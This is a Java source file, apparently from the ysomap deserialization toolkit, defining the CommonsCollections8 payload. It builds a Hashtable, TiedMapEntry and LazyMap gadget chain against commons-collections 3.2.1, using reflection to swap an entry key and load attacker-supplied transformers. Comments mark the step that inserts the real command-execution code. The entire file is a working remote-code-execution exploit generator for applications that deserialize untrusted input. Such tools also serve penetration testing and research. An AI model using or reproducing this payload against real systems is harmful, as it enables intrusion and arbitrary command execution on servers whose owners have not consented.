package ysomap.gadget.payload.collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.collections.TransformerBullet;
import ysomap.runner.PayloadTester;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.payload.Payload;
import ysomap.serializer.Serializer;
import ysomap.serializer.SerializerFactory;
import ysomap.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({ Authors.WH1T3P1G })
public class CommonsCollections8 extends Payload<Hashtable> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Transformer[];
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("");
    }

    @Override
    public Hashtable pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        Hashtable hashtable = new Hashtable();
        hashtable.put("foo",1);
        // 获取hashtable的table类属性
        Field tableField = Hashtable.class.getDeclaredField("table");
        Reflections.setAccessible(tableField);
        Object[] table = (Object[])tableField.get(hashtable);
        Object entry1 = table[0];
        if(entry1==null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        Field keyField = entry1.getClass().getDeclaredField("key");
        Reflections.setAccessible(keyField);
        // 将key属性给替换成构造好的TiedMapEntry实例
        keyField.set(entry1, entry);
        // 填充真正的命令执行代码
        Reflections.setFieldValue(transformerChain, "iTransformers", obj);

        return hashtable;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) {
        return new TransformerBullet(command, "3");
    }

    public static void main(String[] args) {
        new PayloadTester(CommonsCollections8.class).run();
    }
}
